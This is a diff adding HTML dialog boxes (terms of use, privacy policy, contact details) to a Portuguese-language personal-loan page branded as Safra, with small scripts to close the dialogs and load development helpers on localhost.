+  <div class="ss-dialog-head"><h2>Termos de Uso</h2><button class="ss-dialog-close" onclick="this.closest('dialog').close()">&times;</button></div>
+  <div class="ss-dialog-body">
+    <h3>1. Aceitação dos Termos</h3>
+    <p>Ao acessar e utilizar os serviços da Safra, você concorda com estes Termos de Uso.</p>
+    <h3>2. Serviços Oferecidos</h3>
+    <p>A Safra é uma instituição financeira digital que oferece serviços de empréstimo pessoal com aprovação rápida e processo 100% online.</p>
+    <h3>3. Elegibilidade</h3>
+    <ul><li>Ser maior de 18 anos</li><li>Possuir CPF válido</li><li>Ter conta bancária ativa em seu nome</li></ul>
+  </div>
+</dialog>
+
+<dialog id="ss-privacidade" class="ss-dialog">
+  <div class="ss-dialog-head"><h2>Política de Privacidade</h2><button class="ss-dialog-close" onclick="this.closest('dialog').close()">&times;</button></div>
+  <div class="ss-dialog-body">
+    <h3>1. Coleta de Dados</h3>
+    <p>A Safra coleta dados pessoais, de contato, financeiros e de navegação.</p>
+    <h3>2. Seus Direitos (LGPD)</h3>
+    <ul><li>Acessar seus dados pessoais</li><li>Corrigir dados incompletos</li><li>Solicitar exclusão de dados</li></ul>
+  </div>
+</dialog>
+
+<dialog id="ss-contato" class="ss-dialog">
+  <div class="ss-dialog-head"><h2>Fale Conosco</h2><button class="ss-dialog-close" onclick="this.closest('dialog').close()">&times;</button></div>
+  <div class="ss-dialog-body">
+    <div class="ss-contact-item"><div class="ss-contact-icon"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24" width="24" height="24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"/></svg></div><div><h4>Email</h4><p>contato@safra.com.br</p></div></div>
+    <div class="ss-contact-item"><div class="ss-contact-icon"><svg fill="currentColor" viewBox="0 0 24 24" width="24" height="24"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347z"/></svg></div><div><h4>ParceiroChat</h4><p>(11) 98765-4321</p></div></div>
+    <div class="ss-contact-note"><p><strong>CNPJ:</strong> 58.160.789/0001-28</p><p><strong>Razão Social:</strong> Banco Safra S.A.</p></div>
+  </div>
+</dialog>
+
+<script>
+document.querySelectorAll('.ss-dialog').forEach(function(d){d.addEventListener('click',function(e){if(e.target===d)d.close();});});
+</script>
+
+<script>if(/^(localhost|127\.0\.0\.1)$/.test(location.hostname)){var s=document.createElement("script");s.src="/dev-mode.js";document.body.appendChild(s);}</script>
+<script src="../../js/devnav.js"></script>
+</body></html>
